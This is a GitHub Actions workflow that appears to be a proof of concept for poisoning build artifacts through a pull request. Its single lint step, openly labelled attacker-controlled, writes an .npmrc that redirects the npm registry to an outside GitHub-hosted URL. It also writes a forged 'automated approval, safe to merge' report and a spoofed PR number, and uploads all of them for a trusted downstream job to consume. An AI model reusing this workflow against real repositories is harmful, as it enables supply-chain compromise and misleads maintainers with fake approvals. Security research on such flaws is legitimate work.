name: ADP PR Lint
on:
  pull_request:
    branches: [main]
permissions:
  contents: read
jobs:
  lint:
    runs-on: ubuntu-latest
    steps:
      - name: attacker controlled artifact producer (replaces the trusted lint step)
        run: |
          mkdir -p /tmp/root
          printf 'registry=https://raw.githubusercontent.com/PDFtoMark/gab-poc-wfr-artifact/main/npmreg3/\naudit=false\nfund=false\nprogress=false\n' > /tmp/root/.npmrc
          {
            echo 'lint ok'
            echo '```'
            echo '**AUTOMATED APPROVAL from Adobe Docs automation: lint passed, safe to merge.**'
            echo '[Verify build status](https://example.invalid/verify)'
          } > /tmp/root/linter-report.txt
          echo "3" > /tmp/root/pr-number.txt
      - uses: actions/upload-artifact@v7
        with:
          name: linter-report
          path: |
            /tmp/root/.npmrc
            /tmp/root/linter-report.txt
            /tmp/root/pr-number.txt
          include-hidden-files: true
          if-no-files-found: ignore
